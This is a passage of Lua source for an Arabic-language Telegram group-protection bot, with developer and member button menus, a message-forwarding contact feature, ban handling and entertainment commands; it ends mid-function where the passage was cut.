DevRio:incr(David..'Rio:UsersMsgs'..David..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(David..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(David..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(David.."Rio:Users",msg.chat_id_) then
DevRio:sadd(David.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source David     --
if ChatType == 'pv' then 
if text == '/start' or text == '↫ رجوع ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| مرحبا عزيزي المطور \n✧| انت المطور الاساسي هنا \n✧| اليك ازرار سورس مختل \n✧| تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ السورس ✧|','وضع اسم البوت'},
{'↫  المطورين ✧|','↫ الاحصائيات ✧|'},
{'↫ التفعيل والتعطيل ✧|','↫ الاذاعه ✧|'},
{'↫ تعيين كلايش الاوامر ✧|','↫ العام ✧|','↫ ردود الخاص ✧|'},
{'↫ المتجر ✧|','↫ الاوامر الخدميه ✧|'},
{'↫ الاشتراك الاجباري ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ تعيين كلايش الاوامر ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بتعديل وتغيير كلايش سورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ السورس ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بتحديث  سورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ✧|','↫ تحديث ✧|'},
{'↫ السيرفر ✧|'},
{'↫ مبرمج السورس ✧|','↫ قناة السورس ✧|'},
{'↫  السورس ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاحصائيات ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه ب أحصائيات  سورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ✧|'},
{'↫ المشتركين ✧|','↫ المجموعات ✧|'},
{'↫ روابط المجموعات ✧|','↫ جلب نسخه احتياطيه ✧|'},
{'↫ تنظيف المشتركين ✧|','↫ تنظيف المجموعات ✧|'},
{'↫ نقل الاحصائيات ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫  المطورين ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه ب المطورين لسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ الاساسيين ✧|','مسح الاساسيين'},
{'↫ الثانويين ✧|','مسح الثانويين'},
{'↫ المطورين ✧|','مسح المطورين'},
{'↫ تغير المطور الاساسي ✧|','↫ تغيير كليشه المطور ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ التفعيل والتعطيل ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه ب التفعيل والتعطيل لسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعطيل التواصل ✧|','↫ تفعيل التواصل ✧|'},
{'↫ تعطيل ترحيب البوت ✧|','↫ تفعيل ترحيب البوت ✧|'},
{'↫ تعطيل المغادره ✧|','↫ تفعيل المغادره ✧|'},
{'↫ تعطيل الاذاعه ✧|','↫ تفعيل الاذاعه ✧|'},
{'↫ تعطيل البوت الخدمي ✧|','↫ تفعيل البوت الخدمي ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاذاعه ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بالاذاعه لسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ✧|'},
{'↫ اذاعه خاص ✧|','↫ اذاعه عام ✧|'},
{'↫ اذاعه خاص بالتوجيه ✧|','↫ اذاعه عام بالتوجيه ✧|'},
{'الغاء'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ العام ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بالعام لسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اضف رد عام ✧|','↫ حذف رد عام ✧|'},
{'↫ ردود العام ✧|','↫ مسح ردود العام ✧|'},
{'↫ قائمه العام ✧|','مسح قائمه العام'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ ردود الخاص ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بردود الخاص لسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعيين رد الخاص ✧|','↫ حذف رد الخاص ✧|'},
{'↫ جلب رد الخاص ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاشتراك الاجباري ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بالاشتراك الاجباري لسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  تفعيل الاشتراك الاجباري ✧|','↫  تعطيل الاشتراك الاجباري ✧|'},
{'↫ تعيين قناة الاشتراك ✧|',' ↫ حذف قناة الاشتراك ✧|'},
{'↫ تغير كليشه الاشتراك ✧|','↫ حذف كليشه الاشتراك ✧|'},
{'↫ كليشه الاشتراك ✧|','↫ قناة الاشتراك ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ المتجر ✧|' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي المطور \n✧| اليك الازرار الخاصه بمتجر سورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  المتجر ✧|'},
{'تفعيل ملف AddedMe.lua','تعطيل ملف AddedMe.lua'},
{'تفعيل ملف AutoFile.lua','تعطيل ملف AutoFile.lua'},
{'تفعيل ملف TagAll.lua','تعطيل ملف TagAll.lua'},
{'تفعيل ملف TagAdmins.lua','تعطيل ملف TagAdmins.lua'},
{'تفعيل ملف ReplyBot.lua','تعطيل ملف ReplyBot.lua'},
{'تفعيل ملف ProNames.lua','تعطيل ملف ProNames.lua'},
{'تفعيل ملف MuteNames.lua','تعطيل ملف MuteNames.lua'},
{'تفعيل ملف ChangeUser.lua','تعطيل ملف ChangeUser.lua'},
{'تفعيل ملف ChangePhoto.lua','تعطيل ملف ChangePhoto.lua'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاوامر الخدميه ✧|' or text == '/play' or text == '↫  رجوع  ✧|' or text == 'اوامر الخدميه' or text == '/free' then
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي \n✧| اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اوامر التسليه ✧|','↫ الاوامر الخدميه  ✧|'},
{'↫ اوامر النسب ✧|','↫ العاب ✧|'},
{'↫  السورس ✧|','↫  المطور ✧|'},
{'↫ رجوع ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر التسليه ✧|' then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي \n✧| اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ✧|','↫ اغنيه ✧|'},
{'↫ ميمز ✧|','↫ ريمكس ✧|'},
{'↫ صوره ✧|','↫ متحركه ✧|'},
{'↫ مسلسل ✧|','↫ فلم ✧|'},
{'↫  رجوع  ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ الاوامر الخدميه  ✧|' then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي \n✧| اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ الابراج ✧|','↫ حساب العمر ✧|'},
{'↫ الزخرفه ✧|','↫ معاني الاسماء ✧|'},
{'↫ الحمايه ✧|'},
{'↫  معرفي ✧|','↫  اسمي ✧|','↫ ايديي ✧|'},
{'↫  نبذتي ✧|','↫ نبذا ✧|'},
{'↫  رجوع  ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ البوتارت ✧|' then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي \n✧| اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ بوت الحذف ✧|','↫ بوت الهمسه ✧|'},
{'↫ بوت اليوتيوب ✧|','↫ بوت الكت ✧|'},
{'↫ بوت الزخرفه ✧|'},
{'↫  رجوع  ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر النسب ✧|' then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي \n✧| اليك الازرار الخاصه بأوامر النسب الخاصه بسورس مختل فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ نسبه الكره ✧|','↫ نسبه الحب ✧|'},
{'↫ نسبه الرجوله ✧|','↫ نسبه الانوثه ✧|'},
{'↫ نسبه الغباء ✧|','↫ نسبه الجمال ✧|'},
{'↫ نسبه الخيانه ✧|'},
{'↫  رجوع  ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ العاب ✧|' then 
local Sudo_Welcome = '✧| اهلا بك مجددا عزيزي \n✧| اليك الازرار الخاصه بألعاب سورس مختل فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
{'↫ الالعاب ✧|','↫ الالعاب المتطوره ✧|'},
{'↫ كت ✧|'},
{'↫ سمايلات ✧|','↫ معاني ✧|'},
{'↫ ترتيب ✧|','↫ حزوره ✧|'},
{'↫ العكس ✧|','↫ المختلف ✧|'},
{'↫ امثله ✧|','↫ اسئله ✧|'},
{'↫ تخمين ✧|',''},
{'↫ رياضيات ✧|','↫ انكليزي ✧|'},
{'↫  رجوع  ✧|'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
--     Source David     --
if text == '/start' and ChCheck(msg) then  
if not DevRio:get(David..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {
{{text="✧| المطور .",url="t.me/"..(dp.username_ or "UUKXX")}},
{{text="✧| السورس .",url="https://t.me/UUKXX"},{text="✧| لتنصيب بوت .",url="https://t.me/cicci"}},{{text="✧| اضفني في مجموعتك .",url="t.me/"..dp.username_.."?startgroup=botstart"}}
}
local start = DevRio:get(David.."Rio:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "✧| مرحبا انا بوت اسمي "..NameBot.."\n✧| اختصاصي حماية المجموعات\n✧| من التفليش والسبام والخخ .. . ،\n✧| تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n✧| سيتم رفع الادمنيه والمنشئ تلقائيا\n✧| ارسل امر /free او /play للتمتع باوامر الاعضاء"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevRio:setex(David..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source David     --
if not SecondSudo(msg) and not DevRio:sismember(David..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(David..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '✧| تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "UUKXX")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'✧| تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '✧| العضو ↫ 「 ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..' 」\n✧| تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:sadd(David..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '✧| العضو ↫ 「 ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..' 」\n✧| تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(David..'Rio:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_Rio(id_user, 0, 1, text, 1, "md")  
Text = '✧| تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '✧| تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '✧| تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '✧| تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '✧| تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source David     --
if text and DevRio:get(David..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| تم الغاء حفظ كليشة الستارت', 1, 'md')
DevRio:del(David..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(David.."Rio:Start:Bot",text)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| تم حفظ كليشة الستارت', 1, 'md')
DevRio:del(David..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' and ChCheck(msg) or text == 'ضع كليشه ستارت' and ChCheck(msg) or text == '↫ تعيين رد الخاص ✧|' and ChCheck(msg) then 
DevRio:set(David..'Rio:Start:Bots'..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' and ChCheck(msg) or text == 'حذف كليشه ستارت' and ChCheck(msg) or text == '↫ حذف رد الخاص ✧|' and ChCheck(msg) then 
DevRio:del(David..'Start:Bot') 
Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' and ChCheck(msg) or text == '↫ جلب رد الخاص ✧|' and ChCheck(msg) then  
local start = DevRio:get(David.."Rio:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "✧| مرحبا انا بوت اسمي "..NameBot.."\n✧| اختصاصي حماية المجموعات\n✧| من التفليش والسبام والخخ .. . ،\n✧| تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n✧| سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' and ChCheck(msg) or text == '↫ تفعيل التواصل ✧|' and ChCheck(msg) then   
local DavidTeam = '✧| اهلا عزيزي ↫ 「 '..RioRank(msg)..' 」\n✧| تم تفعيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(David..'Rio:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ✧|' and ChCheck(msg) then  
local DavidTeam = '✧| اهلا عزيزي ↫ 「 '..RioRank(msg)..' 」\n✧| تم تعطيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(David..'Rio:Texting:Pv',true) 
end
if text == 'تفعيل المطور انلاين' and ChCheck(msg) or text == '↫ تفعيل المطور انلاين ✧|' and ChCheck(msg) then   
local DavidTeam = '✧| اهلا عزيزي ↫ 「 '..RioRank(msg)..' 」\n✧| تم تفعيل المطور انلاين بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(David..'Rio:Devinline:Pv') 
end
if text == 'تعطيل المطور انلاين' and ChCheck(msg) or text == '↫ تعطيل المطور انلاين ✧|' and ChCheck(msg) then  
local DavidTeam = '✧| اهلا عزيزي ↫ 「 '..RioRank(msg)..' 」\n✧| تم تعطيل المطور انلاين بنجاح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(David..'Rio:Devinline:Pv',true) 
end
end
--     Source David     --
if text == "الابراج" or text == "↫ الابراج ✧|" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧|  من خلال البوت يمكنك معرفه توقعات برجك \n✧|  فقط قم بارسال امر برج + اسم البرج \n✧|  مثال : برج الاسد ،\n✧|  لمعرفه برجك قم بالرجوع الى قسم حساب العمر ', 1, 'md') end
if text == "حساب العمر" or text == "↫ حساب العمر ✧|" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧|  من خلال البوت يمكنك حساب عمرك \n✧|  فقط قم بارسال امر احسب + مواليدك الى البوت \n✧|  بالتنسيق التالي مثال : احسب 2000/7/24', 1, 'md') end
if text == "الحمايه" or text == "↫ الحمايه ✧|" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧|  اضف البوت في المجموعه ثم قم برفعه مشرف وارسل تفعيل \n✧|  وتمتع بخدمات غير موجوده في باقي البوتات ', 1, 'md') end
if text == "الزخرفه" or text == "↫ الزخرفه ✧|" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| قم بأرسال أمر زخرفه وثم ارسال الاسم الذي تريد زخرفته بألانجليزي أو العربي', 1, 'md') end
if text == "معاني الاسماء" or text == "↫ معاني الاسماء ✧|" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧|  من خلال البوت يمكنك معرفه معنى اسمك \n✧|  فقط قم بارسال امر معنى اسم + الاسم \n✧|  مثال : معنى اسم انيس', 1, 'md') end
if text == "عدد المسح" or text == "تعين عدد المسح" or text == "تعيين عدد المسح" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧|  فقط قم بارسال امر عدد المسح + عدد المسح \n✧|  مثال : عدد المسح 100', 1, 'md') end
if text == "انطق" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧|  فقط قم بارسال امر انطق + الكلمه\n✧| سيقوم البوت بنطق الكلمه \n✧|  مثال : انطق هلو', 1, 'md') end
if text == "يوتب" and ChCheck(msg) or text == "اليوتاااايوب" and ChCheck(msg) or text == "↫ بوت اليوتريرايوب ✧|" and ChCheck(msg) or text == "بوت الياااوتيوب" and ChCheck(msg) or text == "اريد بوت يااااوتيوب" and ChCheck(msg) or text == "شمرلي بواااات يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/UUKXX"}}} SendInline(msg.chat_id_,'*✧| اضغط للحصول على بوت اليوتيوب*',nil,inline) return false end
if text == "ارسنوين" and ChCheck(msg) or text == "↫ بوت الهمه ✧|" and ChCheck(msg) or text == "بوت اسه" and ChCheck(msg) or text == "يكقةسه" and ChCheck(msg) or text == "اريد ب وويلالهمسه" and ChCheck(msg) or text == "دزلي بوت الهنيمقمسه" and ChCheck(msg) or text == "دزولي بوت الهمحقوقوسه" and ChCheck(msg) then  Dev_Rio(msg.chat_id_, msg.id_, 1, '✧| @YAFAEBOT ', 1, 'md') end
if text == "رابط حذف" and ChCheck(msg) or text == "رابط الاااحذف" and ChCheck(msg) or text == "اريد رابط اااالحذف" and ChCheck(msg) or text == "شمرلي رابط الحرذف" and ChCheck(msg) or text == "اريد رابط تتقرحذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/UUKXX"}}} SendInline(msg.chat_id_,'*✧| اضغط للحصول على رابط الحذف*',nil,inline) return false end
if text == "↫ بوت الح✧|" and ChCheck(msg) or text == "بوت الاااحذف" and ChCheck(msg) or text == "اريد بوت الريريحذف" and ChCheck(msg) or text == "اريد بوت ريتتيحذف" and ChCheck(msg) or text == "بوت حيااقذف" and ChCheck(msg) or text == "بوت حذف حاقهاقسابات" and ChCheck(msg) or text == "راح اتينحذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/UUKXX"}}} SendInline(msg.chat_id_,'*✧| اضغط للحصول على بوت الحذف*',nil,inline) return false end
if text == "↫ بوت ات ✧|" and ChCheck(msg) or text == "بوت ااااالكت" and ChCheck(msg) or text == "بوت ررقاكت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/UUKXX"}}} SendInline(msg.chat_id_,'*✧| اضغط للحصول على بوت الكت*',nil,inline) return false end
if text == "↫ بوت الخرفه ✧|" and ChCheck(msg) or text == "بوت الاااازخرفه" and ChCheck(msg) or text == "بوت زرياياخرفه" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/ALYAFAE_BOT"}}} SendInline(msg.chat_id_,'*✧| اضغط للحصول على بوت الزخرفه*',nil,inline) return false end
if text == "ايديي" and ChCheck(msg) or text == "↫ ايديي ✧|" and ChCheck(msg) then Dev_Rio(msg.chat_id_, msg.id_, 1,'✧| ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
-- Source David --
if text == 'نبذا' and ChCheck(msg) or text == '↫ نبذا ✧|' then
local DavidTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿??𝗋𝖾𝗇??','. 𝖬𝖺𝗄𝖾 ??𝗋𝖾𝖺???? 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..DavidTeam[math.random(#DavidTeam)]..'' , 1, 'md')  
return false
end
--     Source David     --
if text and (text == 'المطور' or text == 'مطور' or text == '↫  المطور ✧|') and not DevRio:get(David..'Rio:Devinline:Pv'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,result)
local msg_id = msg.id_/2097152/0.5
Text = "*✧| Dev Name ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*✧| Dev User ↬* [@"..result.username_.."]"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or UUKXX}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
--     Source David     --
if text == "معرفي" and ChCheck(msg) or text == "↫  معرفي ✧|" and ChCheck(msg) then
function get_username(extra,result,success)
text = '✧| معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Rio(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" and ChCheck(msg) or text == "↫  اسمي ✧|" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '✧| اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastn…
